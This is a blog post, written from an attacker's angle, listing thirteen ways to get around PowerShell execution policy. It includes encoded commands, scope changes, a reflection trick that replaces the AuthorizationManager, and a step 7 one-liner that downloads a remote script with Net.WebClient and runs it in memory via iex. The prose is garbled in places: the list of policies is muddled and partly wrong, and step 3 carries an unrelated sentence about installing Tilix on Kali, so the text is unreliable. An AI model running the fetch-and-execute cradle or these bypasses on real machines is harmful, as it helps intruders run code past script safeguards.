---
layout: post
title:  "How to Bypass PowerShell Execution Policy"
date:   2020-09-24 20:24:26 -0700
categories: PowerShell Execution Policy
---

<h1><b>Intro</b></h1>

PowerShell is an integral part of every windows. From hacker’s perspective, it can be an effective weapon. Even the best-laid plans can be destroyed by its execution policies. On the other hand, there are a number of strategies that can be used to circumvent the execution strategy of PowerShell. 

<h3><b>PowerShell Execution Policy Overview</b></h3>
The object of the execution regulations for the PowerShell is to monitor how to configure files are to be loaded and how scripts are executed. It is a safety feature which helps prevent the execution of malicious scripts. On windows computers, the rules can be set at the level of the computer, user level, and session level. It is necessary to remember that the execution protocol is not designed to be safe. It merely protects users from causing harm accidentally. It can be done in many ways. The execution policies are 7 steps that are the following:
•	Unrestricted: this is the main procedure for computers not running windows. It ensures that scripts are executed with an alert. 
•	Restricted: for windows computers this is the main which blocks the execution of scripts but required individual actions. 
•	Bypass: this ensures that all the scripts will run and no alerts shown or given. 
•	All signed: the required a reputable the creator to sign all the scripts and arrangement files, including the ones that are generated on the local computer. 
•	Remote signed: this is one of the main default policies on the windows servers. Only files accessed out of the internet that need a signature. 
•	Default: in here it actually sets the main policy of implementation. 
•	Undefined: where the existing scope does not contain a policy package if everything is unknown, which are limited defaults to the execution regulations.


{% highlight ruby %}

Get-ExecutionPolicy

{% endhighlight %}

Now that we've covered the basics, let's get started on some bypasses.


<h4><b>Step 1: Bypass Flag </b></h4>
Perhaps the easiest way to bypass execution policy is to use the Bypass flag. Doing so will run the script with no warnings or prompts.

To do so, open PowerShell and type:

{% highlight ruby %}
PowerShell.exe -ExecutionPolicy Bypass -File .\script.ps1
{% endhighlight %}

<h4><b>Step 2: Unrestricted Flag</b></h4>
Similar to the Bypass flag, we can use the Unrestricted flag to run our script, this time with a warning.

{% highlight ruby %}
PowerShell.exe -ExecutionPolicy Unrestricted -File .\script.ps1
{% endhighlight %}

<h4><b>Step 3: Command Switch</b></h4>
We can use the command switch to issue commands and directly run a script. This will work for simple scripts, but more complex ones will usually have errors.
Tilix is available in Kali's APT repositories and can be installed using the below command.

{% highlight ruby %}

PowerShell -command "Write-Host 'This is a test.'"

{% endhighlight %}


<h4><b>Step 4: Encoded Command Switch</b></h4>
This method is similar to the command switch but encodes the script as a base64 encoded string. This can help avoid parsing errors as well as provide a layer of obfuscation.

{% highlight ruby %}
$command = "Write-Host 'This is a test.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
{% endhighlight %}

<h4><b>Step 5: Invoke-Command</b></h4>
The Invoke-Command method is nice in that it can be used to issue commands against remote machines when PowerShell remoting has been enabled.

{% highlight ruby %}
invoke-command -scriptblock {Write-Host "This is a test."}
{% endhighlight %}

<h4><b>Step 6: Invoke-Expression</b></h4>
We can use the Invoke-Expression method to pipe the contents of our script and be executed.

{% highlight ruby %}
Get-Content .\script.ps1 | Invoke-Expression
{% endhighlight %}

<h4><b>Step 7: Download from URL</b></h4>
PowerShell can be used to download a script from the internet, or from an attacker's machine, and then be executed without writing to disk.

{% highlight ruby %}

PowerShell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')"

{% endhighlight %}

<h4><b>Step 8: Paste</b></h4>
Another method to get around execution policy is to simply copy and paste the script into the interactive console. Again, this is useful for running quick scripts that aren't too complex.

{% highlight ruby %}
Write-Host "This is a test."
{% endhighlight %}

<h4><b>Step 9: Echo & Pipe</b></h4>
We can also echo the contents of our script into PowerShell standard input.

{% highlight ruby %}
Echo Write-Host "This is a test." | PowerShell -noprofile -
{% endhighlight %}

<h4><b>Step 10: Read & Pipe</b></h4>
Similar to the echo method, we can read the contents of our script and pipe it into PowerShell standard input.

{% highlight ruby %}
Get-Content .\script.ps1 | PowerShell -noprofile -
{% endhighlight %}

<h4><b>Step 11: Process Scope</b></h4>
The execution policy can be applied at different levels, including the currently controlled process. We can change the execution policy for the current process.

{% highlight ruby %}
Set-ExecutionPolicy Bypass -Scope Process
{% endhighlight %}

<h4><b>Step 12: Current User Scope</b></h4>
This method is similar to the process scope but changes the execution policy for the current user. This works by modifying a registry key under the hood.

{% highlight ruby %}
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
{% endhighlight %}

<h4><b>Step 13: Authorization Manager Swap</b></h4>
The final method we'll cover essentially overrides a function in PowerShell. The AuthorizationManager function will be replaced with a null value when our function is called, setting the execution policy for the session to Unrestricted, and allowing our script to run.

{% highlight ruby %}
function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))} Disable-ExecutionPolicy .\script.ps1
{% endhighlight %}
